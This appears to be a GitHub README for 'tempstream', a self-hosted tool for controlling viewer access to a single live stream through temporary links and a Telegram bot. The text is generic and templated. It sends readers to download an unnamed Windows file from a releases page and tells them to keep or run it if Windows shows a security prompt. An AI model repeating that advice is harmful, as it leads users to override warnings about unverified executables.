# 📺 tempstream - Simple access for one live stream

[![Download tempstream](https://img.shields.io/badge/Download%20tempstream-5865F2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Linneaincorrect877/tempstream/releases)

## 🧭 What tempstream does

tempstream is a small video access service for one live stream. It helps you control who can open the stream, and it fits a setup with a single live source.

Use it when you want to:

- Share one live stream with selected viewers
- Keep access limited with temporary links
- Run a simple self-hosted video access tool
- Connect a live source that uses common streaming tools
- Add a Telegram bot for access and status checks

## 💻 What you need

Before you install tempstream, make sure your Windows PC has:

- Windows 10 or Windows 11
- A stable internet connection
- Enough free disk space for the app files and stream cache
- Permission to run apps from downloaded files
- A live stream source if you plan to view real video

If you run the stream on the same PC, leave it powered on while the stream is active.

## 📥 Download tempstream

Go to the release page here:

https://github.com/Linneaincorrect877/tempstream/releases

On that page, find the latest release and download the Windows file for your system. After the download finishes, open the file you got from the release page.

## 🪟 Install on Windows

1. Open the file you downloaded from the release page.
2. If Windows shows a security prompt, choose the option to keep or run the file.
3. If the app comes in a ZIP file, right-click it and choose Extract All.
4. Move the extracted folder to a place you can find again, such as Downloads or Desktop.
5. Open the tempstream app from that folder.

If Windows asks for permission, click Yes.

## 🚀 First setup

When tempstream starts for the first time, set up these basics:

- Choose the port the app will use
- Set the stream source
- Add access rules for your viewers
- Turn on temporary link support if you want links that expire
- Connect your Telegram bot if you plan to use Telegram controls

A simple setup works best for first use. Start with one stream, one link, and one test viewer.

## 🔧 Stream source setup

tempstream works with a live source that can feed video to your server. Common setups use RTMP and HLS.

A basic flow looks like this:

1. Send your live feed to the stream service
2. Let tempstream manage access to the stream
3. Share the protected link with the viewer
4. Let the viewer open the stream in a browser or supported player

If you already use tools like MediaMTX or Caddy, tempstream can fit into that setup as the access layer.

## 🔐 Access control

tempstream is built to limit who can view the stream. You can use it to:

- Create temporary access links
- Give access to one person at a time
- Restrict viewing to approved users
- Remove access when needed

This is useful when you only want a short viewing window or when you need tighter control over a live event.

## 📱 Telegram bot use

If you connect Telegram, tempstream can work with a bot for simple control and updates.

You can use it to:

- Share access links
- Check stream status
- Send quick commands
- Manage temporary access from a chat

This helps if you want to handle the stream without opening the app each time.

## 🌐 Local network and server setup

You can run tempstream on a home PC, a small server, or a self-hosted machine. For a local setup:

- Keep the app running while the stream is live
- Use the same network for your stream source and viewer if needed
- Make sure the chosen port is free
- Allow the app through Windows Defender or your firewall if needed

If you plan to access the stream from outside your home, your network must allow incoming connections to the server.

## 🛠️ Common tasks

### Start the stream
1. Open tempstream
2. Start your live source
3. Confirm the service sees the stream
4. Share the access link

### Stop the stream
1. Stop the live source
2. Close the stream in tempstream if needed
3. Remove any active temporary links

### Change access
1. Open the access settings
2. Add or remove allowed users
3. Refresh the link if you need a new one

### Restart after a crash
1. Close the app
2. Open it again
3. Check that the stream source is still sending video
4. Test the access link

## 🧪 Simple test plan

Use this quick check after setup:

1. Open tempstream
2. Start your live source
3. Create one access link
4. Open the link in a browser on the same PC
5. Confirm the video loads
6. Test a second device if you want to check network access
7. Remove the link and make sure it no longer works

If the test works, your setup is ready for normal use.

## 🧯 If something does not work

Try these steps:

- Check that the app is still open
- Make sure your stream source is running
- Confirm the port is not in use by another app
- Refresh the page if the viewer shows a blank screen
- Restart the app and the stream source
- Check Windows firewall rules
- Make sure the download finished before you tried to open it

If the stream does not appear, the source may not be sending video yet.

## 📁 File and folder use

tempstream may use local files to store:

- App settings
- Access data
- Stream state
- Temporary link records
- Log data

Keep the app folder in a place you do not delete by accident. If you move it, move the whole folder.

## 🔒 Privacy and access

Use tempstream when you want more control over who can see a live stream. Keep the access link private. Remove old links when they are no longer needed. If you use Telegram, make sure only the right people can reach the bot chat

## 🧩 Typical use case

A common setup looks like this:

- One camera or encoder sends video to the service
- tempstream protects the stream with access rules
- A viewer gets a temporary link
- The link works for a short time
- The link expires after use

This works well for private events, team checks, internal viewing, and short-lived live access

## 📌 Terms you may see

- RTMP: a common way to send live video to a server
- HLS: a common way to play live video in a browser
- Caddy: a web server that can help serve web traffic
- MediaMTX: a live media server used in streaming setups
- Temporary link: a link that stops working after a set time
- Self-hosted: software you run on your own machine or server

## ✅ Before you share it

Before you give the link to anyone else:

- Test the stream on your own device
- Make sure access rules are set the way you want
- Check that the link expires when expected
- Confirm the viewer can open the stream without errors
- Remove test links you no longer need